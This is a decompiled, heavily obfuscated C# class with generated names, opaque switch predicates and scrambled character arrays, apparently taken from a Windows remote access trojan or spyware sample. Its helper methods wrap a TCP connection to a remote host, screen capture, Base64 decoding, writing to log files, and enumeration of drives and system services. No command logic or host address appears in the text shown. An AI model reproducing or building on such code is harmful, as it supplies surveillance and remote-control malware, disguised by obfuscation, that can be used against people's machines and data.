using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Windows.Forms;
using Microsoft.VisualBasic.ApplicationServices;

[GeneratedCode("MyTemplate", "11.0.0.0")]
[EditorBrowsable(EditorBrowsableState.Never)]
internal sealed class Class4 : ConsoleApplicationBase
{
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 3876)]
	private struct Struct2
	{
	}

	private static readonly object object_0;

	private static readonly Array array_0;

	private static readonly Array array_1;

	internal static byte byte_0/* Not supported: data(00) */;

	static Class4()
	{
		array_0 = new char[1938];
		char[] array = new char[8];
		array[2] = '〣';
		array[7] = '㰎';
		array[3] = '㏵';
		array[4] = '㾶';
		array[5] = 'ʛ';
		array[1] = 'Ề';
		array[0] = 'ὶ';
		array[6] = '\u17ee';
		array_1 = new string[136];
		object_0 = array;
	}

	internal static string smethod_0<T, U, V, W>(V gparam_0, T gparam_1, U gparam_2, W gparam_3, int int_0, short short_0) where T : string where U : string where V : string where W : string
	{
		int num = 0;
		string result = (((int_0 ^ short_0) - 89) ^ 0) switch
		{
			0 => string.Concat(gparam_0, gparam_1, gparam_2, gparam_3), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_1<T>(T gparam_0, byte[] byte_1, int int_0, int int_1, int int_2, short short_0) where T : MemoryStream
	{
		int num = 0;
		int num2;
		do
		{
			switch (((int_2 ^ short_0) - 25) ^ num)
			{
			case 0:
				gparam_0.Write(byte_1, int_0, int_1);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static void smethod_2<T, U>(T gparam_0, U gparam_1, short short_0, int int_0) where T : RichTextBox where U : Font
	{
		int num = 0;
		switch (((int_0 ^ short_0) - 10) ^ 0)
		{
		case 0:
			((RichTextBox)gparam_0).set_Font((Font)(object)gparam_1);
			break;
		}
		num++;
	}

	internal static void smethod_3<T, U>(U gparam_0, T gparam_1, int int_0, int int_1, int int_2) where T : string where U : TcpClient
	{
		int num = 0;
		switch (((int_2 ^ int_1) - 115) ^ 0)
		{
		case 0:
			gparam_0.Connect(gparam_1, int_0);
			break;
		}
		num++;
	}

	internal static void smethod_4<T, U>(U gparam_0, T gparam_1, short short_0, char char_0) where T : string where U : Control
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ char_0) - 5) ^ num)
			{
			case 0:
				((Control)gparam_0).set_Name((string)gparam_1);
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static void smethod_5<T>(T gparam_0, int int_0, int int_1, int int_2, int int_3, Size size_0, CopyPixelOperation copyPixelOperation_0, int int_4, char char_0) where T : Graphics
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		switch (((int_4 ^ char_0) - 56) ^ 0)
		{
		case 0:
			((Graphics)gparam_0).CopyFromScreen(int_0, int_1, int_2, int_3, size_0, copyPixelOperation_0);
			break;
		}
		num++;
	}

	internal static string smethod_6<T, U, V>(V gparam_0, T gparam_1, U gparam_2, short short_0, char char_0) where T : string where U : string where V : string
	{
		int num = 0;
		string result;
		do
		{
			result = (((char_0 ^ short_0) - 120) ^ num) switch
			{
				0 => gparam_0.Replace(gparam_1, gparam_2), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static Size smethod_7<T>(T gparam_0, short short_0, short short_1) where T : Image
	{
		int num = 0;
		Size result;
		do
		{
			result = (((short_0 ^ short_1) - 67) ^ num) switch
			{
				0 => ((Image)gparam_0).get_Size(), 
				_ => default(Size), 
			};
			num++;
		}
		while ((short_1 * short_1 + short_1) % 2 != 0);
		return result;
	}

	internal static void smethod_8<T>(T gparam_0, short short_0, short short_1) where T : Image
	{
		int num = 0;
		switch (((short_1 ^ short_0) - 32) ^ 0)
		{
		case 0:
			((Image)gparam_0).Dispose();
			break;
		}
		num++;
	}

	internal static StreamWriter smethod_9<T>(T gparam_0, char char_0, int int_0) where T : string
	{
		int num = 0;
		StreamWriter result;
		int num2;
		do
		{
			result = (((char_0 ^ int_0) - 41) ^ num) switch
			{
				0 => File.AppendText(gparam_0), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static byte[] smethod_10<T>(T gparam_0, short short_0, short short_1) where T : string
	{
		int num = 0;
		byte[] result;
		int num2;
		do
		{
			result = (((short_0 ^ short_1) - 100) ^ num) switch
			{
				0 => (byte[])(Array)Convert.FromBase64String(gparam_0), 
				_ => null, 
			};
			num++;
			num2 = short_1 * short_1;
			num2 = short_1 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static string smethod_11<T>(T gparam_0, short short_0, short short_1) where T : DriveInfo
	{
		int num = 0;
		string result;
		int num2;
		do
		{
			result = (((short_1 ^ short_0) - 24) ^ num) switch
			{
				0 => gparam_0.VolumeLabel, 
				_ => null, 
			};
			num++;
			num2 = short_1 * short_1;
			num2 = short_1 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static string smethod_12<T>(T gparam_0, char char_0, short short_0) where T : ServiceController
	{
		int num = 0;
		string result = (((char_0 ^ short_0) - 118) ^ 0) switch
		{
			0 => ((ServiceController)gparam_0).get_ServiceName(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_13<T>(T gparam_0, char char_0, char char_1) where T : Timer
	{
		int num = 0;
		do
		{
			switch (((char_0 ^ char_1) - 9) ^ num)
			{
			case 0:
				((Timer)gparam_0).Stop();
				break;
			}
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
	}

	internal static IEnumerator smethod_14<T>(T gparam_0, int int_0, short short_0) where T : ReadOnlyCollectionBase
	{
		int num = 0;
		IEnumerator result = (((short_0 ^ int_0) - 64) ^ 0) switch
		{
			0 => gparam_0.GetEnumerator(), 
			_ => null, 
		};
		num++;
		return result;
	}
}
